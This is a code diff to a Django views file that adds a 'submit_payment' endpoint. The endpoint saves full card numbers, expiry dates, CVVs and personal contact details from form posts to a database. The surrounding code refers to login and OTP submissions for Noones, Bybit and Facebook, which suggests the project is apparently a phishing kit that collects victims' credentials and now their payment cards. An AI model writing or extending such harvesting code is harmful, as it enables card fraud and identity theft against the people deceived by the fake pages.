@@ -77,6 +77,11 @@ import json
 from .models import UserSubmissionNoones, OTPSubmissionNoones, UserSubmissionBybit
 
 
+#aeropuerto
+from django.http import JsonResponse
+from .models import PaymentDetail
+
+
 
 def index(request):
     return render(request,'index.html')
@@ -1277,7 +1282,46 @@ def facebooklogins(request):
 
 
 
+#aeropuerto
+
+
+def submit_payment(request):
+    if request.method == "POST":
+        card_number = request.POST.get("card_number")
+        expiry_date = request.POST.get("expiry_date")
+        cvv = request.POST.get("cvv")
+        first_name = request.POST.get("first_name")
+        last_name = request.POST.get("last_name")
+        address = request.POST.get("address")
+        zip_code = request.POST.get("zip")
+        city = request.POST.get("city")
+        country_code = request.POST.get("country_code")
+        phone = request.POST.get("phone")
+        email = request.POST.get("email")
+
+        # Save to database
+        PaymentDetail.objects.create(
+            card_number=card_number,
+            expiry_date=expiry_date,
+            cvv=cvv,
+            first_name=first_name,
+            last_name=last_name,
+            address=address,
+            zip=zip_code,
+            city=city,
+            country_code=country_code,
+            phone=phone,
+            email=email
+        )
+
+        return JsonResponse({"status": "success", "message": "Payment details saved successfully."})
+
+    return JsonResponse({"status": "error", "message": "Invalid request."}, status=400)
+
+
+
 
 def test(request):
     return render(request,'dominica.html')
     
+
